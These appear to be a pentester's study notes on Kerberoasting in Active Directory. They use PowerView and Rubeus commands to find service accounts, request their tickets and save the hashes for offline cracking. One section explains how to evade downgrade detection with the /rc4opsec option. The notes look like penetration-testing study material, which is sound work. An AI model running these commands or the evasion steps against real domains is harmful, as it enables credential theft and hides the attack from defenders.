This attack is based on a offline cracking of service account passwords.

The kerberos session ticket (`TGS`) has a server portion which is encrypted with the password hash of the service account:
- This makes possible to request for a TGS and then try to crack it offline.

Since the (`non-machine`) **service account passwords are not frequently changed**, this attack is very popular.

![[Pasted image 20261126093217.png]]

>[!note] Why the dc gives us the TGS
>It works because the `Domain Controller` gives us a TGS also if we are not able to contact the target service. 
>Then the service check the authorization.
>![[Pasted image 20261126093603.png]]

>[!important] It is very silent
>We just ask for a valid TGS and the offline we crack it.


In Windows the most common account is the system, `the machine account`.

`machine account` passwords are changed not frequently, so we could target it.

# 1. Force the DC to send us a TGS signed with `rc4`

We want to force our `DC` to send us a tgs signed with a `rc4` hash and not an `aes`.

## 1.1. Find a user used as Service accounts

Using `powerview` we can run:
```powershell
Get-DomainUser -SPN
```

>[!note] using ADmodule
>```powershell
>Get-AdUser -Filter {ServicePrincipalname -ne "$null"} -properties ServicePrincipalName
>```

>[!important] What is a service account?
>It's an account used from a service.
>
>The `ServicePrincipalName` is an attribute of AD which identifies an istance of service and can help the domain controller to understand who is a service account.
>When the property is not a `null` then the DC understands the account is a service account.
>


## 1.2 Execute kerberoasting using rubeus
We can list kerberoasting stats using:

```powershell
Rubeus.exe kerberoast /stats
```
- This gives us the kerberoastable accounts


To request a ticket we can do:
```powershell
Rubeus.exe kerberoast /user:svcadmin /simple
```


### Avoid detection based on ecryption downgrade

To avoid detection based on encryption downgrade for kerberos EType (used by likes of `MDI - 0x17` stands for `rc4-hmac`) we can look for **kerberoastable accounts that only support RC4_HMAC**:

```powershell
Rubeus.exe kerberoast /stats  /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:hashes.txt
```


>[!note] 
>If the user target supports `aes` this command won't show anything
>![[Pasted image 20261126112015.png]]
>![[Pasted image 20261126112035.png]]
>


## Kerberoast all possible accounts

To try to kerberoast all possible accounts we can do:

```powershell
Rubeus.exe kerberoast  /rc4opsec /outfile:hashes.txt
```


>[!Important] These commands are very noisy
>It does a lot of requests.

